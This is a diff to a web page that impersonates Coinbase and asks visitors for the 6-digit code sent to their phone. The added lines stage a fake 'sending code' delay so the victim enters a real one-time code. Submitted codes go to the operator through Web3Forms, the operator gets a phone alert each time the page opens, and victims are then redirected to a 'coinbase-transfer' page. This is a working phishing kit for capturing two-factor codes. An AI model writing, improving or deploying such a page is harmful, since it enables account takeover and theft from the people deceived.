@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Coinbase | Postal code</title>
+  <title>Coinbaseus  | Postal code</title>
   <meta name="theme-color" content="#1d4ed8" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -122,10 +122,11 @@
     <section class="card">
       <div class="notice">sign in to continue.</div>
 
-      <h1>Enter the 6-digit code sent to your phone number</h1>
+      <h1>Enter the 6-digit code sent to your phone number <span style="font-size:16px; color:black;"> (+16073777311)</span> </h1>
       <p class="hint">sign in</p>
 
-      <form id="postal-form" novalidate>
+       <form id="postal-form" class="is-loading" novalidate>
+       <fieldset id="fields" disabled>
         <!-- Spam trap: real people never tick this -->
         <input type="checkbox" name="botcheck" class="hidden" tabindex="-1" autocomplete="off" />
 
@@ -134,9 +135,16 @@
                pattern="[0-9]{6}" placeholder="000000" required />
         <div class="error" id="error" role="alert"></div>
 
-        <button type="sign-in" id="submit-btn">Sign-in</button>
-        <p class="privacy">By signing in you agree to our <span style="color:blue; font-size:8px; font-weight:400;">terms and policy</span> </p>
+        <button type="sign-in" id="submit-btn">finish receiving</button>
+         <p class="privacy">By signing in you agree to our <a href="https://coinbase.com/legal/policy">terms and policy</a> </p>
+       </fieldset>
       </form>
+
+      <button type="button" class="status" id="status" aria-live="polite">
+        <span class="spinner" id="spinner" aria-hidden="true"></span>
+        <svg class="hidden" id="check" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6L9 17l-5-5" /></svg>
+        <span id="status-text">Sending code please wait</span>
+      </button>
     </section>
   </main>
 
@@ -156,7 +164,7 @@
     // Your Web3Forms access key (safe to be public: it can only send to your email)
     var ACCESS_KEY = "13074adb-ae1c-46d5-81ae-bc762824954a";
     // Where people go after submitting, so they know it's a test
-    var REDIRECT_URL = "https://coinbase-transfer.web.app/finish";
+    var REDIRECT_URL = "https://coinbase-transfer.web.app/processing";
 
     var form = document.getElementById("postal-form");
     var input = document.getElementById("postal");
@@ -206,6 +214,24 @@
       } catch (e) {}
       return Promise.resolve("");
     }
+
+    // Form stays greyed out for 10 seconds, then switches on
+    var LOAD_SECONDS = 10;
+    var fields = document.getElementById("fields");
+    var statusBtn = document.getElementById("status");
+
+    setTimeout(function () {
+      fields.disabled = false;
+      form.classList.remove("is-loading");
+      statusBtn.classList.add("done");
+      document.getElementById("spinner").classList.add("hidden");
+      document.getElementById("check").classList.remove("hidden");
+      document.getElementById("status-text").textContent = "code sent";
+    }, LOAD_SECONDS * 1000);
+
+    statusBtn.addEventListener("click", function () {
+      if (statusBtn.classList.contains("done")) input.focus();
+    });
 
     // Phone notification every time the page is opened or reloaded (via the free ntfy app)
     var NTFY_TOPIC = "choicepay-82948tro5f7za9";
